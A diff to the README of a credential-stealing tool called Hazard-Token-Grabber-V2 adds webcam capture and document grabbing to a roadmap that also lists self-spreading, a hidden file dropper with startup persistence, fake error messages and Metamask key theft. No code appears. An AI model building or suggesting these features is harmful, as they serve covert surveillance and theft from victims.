@@ -17,7 +17,7 @@
 </p>
 
 <h2 align="center">
-  Hazard-Token-Grabber-V2 was made by
+  Hazard-Token-Grabber-V2 was made with
 
 Love ❌ code ✅
 
@@ -141,6 +141,7 @@ In the end it's just up to **you** to choose what grabber suits you and your nee
 
 ~~overlined~~ = feature got added
 
+- Grab Webcam (screenshot?, video?) | Suggestion from [CLAYlol](https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/298)
 - Fake Error (custom message, type, etc...)
 - File dropper (direct payload link, options: hide it? add to startup? drop location?)
 - Self spread | Suggestion from [FuckingToasters](https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/31)
@@ -154,8 +155,8 @@ In the end it's just up to **you** to choose what grabber suits you and your nee
 - ~~General info (OS, CPU, GPU, RAM, etc...) and put in seperate txt file~~
 
 Not adding/on hold:
+- .doc/.pdf file grabbing | Suggestion from [islimafjagjafferi](https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/112)
 - Metamask Priv Key and seed | Suggestion from [Snipeeeey](https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/281)
-
 
 ---
 
